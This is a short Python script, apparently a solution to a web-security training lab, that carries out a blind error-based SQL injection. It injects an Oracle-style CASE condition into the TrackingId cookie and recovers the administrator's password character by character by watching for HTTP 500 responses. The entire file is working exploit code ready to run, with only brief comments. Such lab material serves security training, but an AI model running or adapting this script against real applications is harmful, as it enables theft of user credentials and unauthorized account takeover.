import requests
import string

# Set the target URL
url = "https://0aef008f04667a9c83ee831e004800e8.web-security-academy.net/"

# Define session cookies
tracking_id = "cf0TIM6uE9oXtwj5"
session = "CN3T8AJ1GDQhTbXSNaVdhu020gESmoic"

# Define possible password characters
chars = string.ascii_letters + string.digits
password = ""

# Extract password character by character
for position in range(1, 21):
    for char in chars:

        # Inject SUBSTR condition into TrackingId
        cookies = {
            "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--",
            "session": session
        }

        # Send request and check HTTP response
        response = requests.get(url, cookies=cookies)

        # HTTP 500 indicates matching character
        if response.status_code == 500:
            password += char
            print(f"[+] {position}: {char} -> {password}")
            break

# Print extracted password
print(f"\nPassword: {password}")

